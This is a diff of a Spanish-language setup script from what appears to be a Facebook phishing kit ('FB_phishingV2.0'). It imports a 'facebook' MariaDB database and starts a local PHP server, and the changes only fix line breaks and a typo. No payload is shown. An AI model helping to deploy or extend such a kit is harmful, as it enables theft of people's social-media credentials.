@@ -67,8 +67,10 @@ cd ~/FB_phishingV2.0
 cp -r fb.sql $PREFIX/bin
 mariadb -u root -e "create database facebook"
 mariadb -u root facebook < fb.sql
-echo -e "\e[1;36m LA DATABASE FACEBBOK SE CREO CON EXITO"                                                sleep 1.5
-clear                                                banner
+echo -e "\e[1;36m LA DATABASE FACEBOOK SE CREO CON EXITO"                                                
+sleep 1.5
+clear                                               
+banner
 seleccion
 	fi
 ;;
@@ -91,7 +93,8 @@ then
     clear
     banner
     seleccion
-else                                                     echo -e   "\e[1;31m El servidor PHP local está APAGADO, Lo Activaremos" 
+else                                                   
+echo -e   "\e[1;31m El servidor PHP local está APAGADO, Lo Activaremos" 
 printf $reset
     sleep 2
     php -S localhost:1212
